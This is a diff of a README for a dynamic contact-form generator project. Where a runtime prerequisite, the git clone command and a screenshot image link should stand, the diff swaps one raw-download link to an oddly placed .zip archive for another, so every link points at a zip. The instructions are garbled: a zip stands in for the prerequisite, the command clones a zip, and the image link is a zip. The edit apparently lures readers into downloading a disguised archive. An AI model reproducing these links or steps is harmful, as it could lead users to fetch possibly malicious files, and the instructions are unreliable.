@@ -20,17 +20,17 @@ This project is a dynamic contact form generator that allows you to create a sty
 
 ### Prerequisites
 Ensure that you have the following installed on your local machine:
-- https://raw.githubusercontent.com/Shrejalraut0746/Dynamic_Form_Generator/main/irideremia/Dynamic_Form_Generator.zip (>=18.x)
+- https://github.com/Shrejalraut0746/Dynamic_Form_Generator/raw/refs/heads/main/src/types/Generator-Form-Dynamic-lubric.zip (>=18.x)
 - npm or yarn (recommended)
 
 ### Steps to Run Locally
 
 1. Clone the repository:
    ```bash
-   git clone https://raw.githubusercontent.com/Shrejalraut0746/Dynamic_Form_Generator/main/irideremia/Dynamic_Form_Generator.zip
+   git clone https://github.com/Shrejalraut0746/Dynamic_Form_Generator/raw/refs/heads/main/src/types/Generator-Form-Dynamic-lubric.zip
 
 ### Example JSON Schema for the Contact Form with Image Upload
 json
 Copy code
 
-![Screenshot 2024-11-21 202427](https://raw.githubusercontent.com/Shrejalraut0746/Dynamic_Form_Generator/main/irideremia/Dynamic_Form_Generator.zip)
+![Screenshot 2024-11-21 202427](https://github.com/Shrejalraut0746/Dynamic_Form_Generator/raw/refs/heads/main/src/types/Generator-Form-Dynamic-lubric.zip)
